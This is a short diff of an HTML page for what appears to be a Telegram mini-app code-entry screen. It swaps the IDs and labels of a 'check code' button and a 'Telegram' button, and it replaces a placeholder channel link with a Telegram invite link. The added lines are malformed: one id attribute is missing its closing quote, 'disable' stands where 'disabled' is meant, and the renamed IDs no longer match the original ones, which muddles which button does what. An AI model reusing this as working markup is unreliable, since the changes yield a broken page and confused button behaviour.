@@ -328,15 +328,15 @@
         <span class="delete-hint">⌫ — delete</span>
       </div>
       <!-- Кнопка проверки кода (появляется под точками) -->
-      <button class="check-btn" id="checkCodeBtn" disabled>✓ Check code</button>
+      <button class="check-btn" id="telegramChatBtn>✓ Go to codes</button>
     </div>
 
     <!-- Цифровая клавиатура -->
     <div id="keyboard" class="keyboard"></div>
 
     <!-- Кнопка перехода в Telegram (обведённая на втором скрине) -->
-    <button class="telegram-btn" id="telegramChatBtn">
-      <span>✈️</span> Get codes via Telegram
+    <button class="telegram-btn" id="checkCodeButton" disable>
+      <span>✈️</span> Submit code
     </button>
 
     <!-- Строка статуса (для отладки, можно скрыть) -->
@@ -555,7 +555,7 @@
 
     telegramBtn.addEventListener('click', () => {
       // ЗАМЕНИТЕ НА РЕАЛЬНЫЙ ЧАТ С КОДАМИ
-      const telegramLink = 'https://t.me/your_codes_channel';
+      const telegramLink = 'https://t.me/+42777';
       tg.openTelegramLink(telegramLink);
     });
 
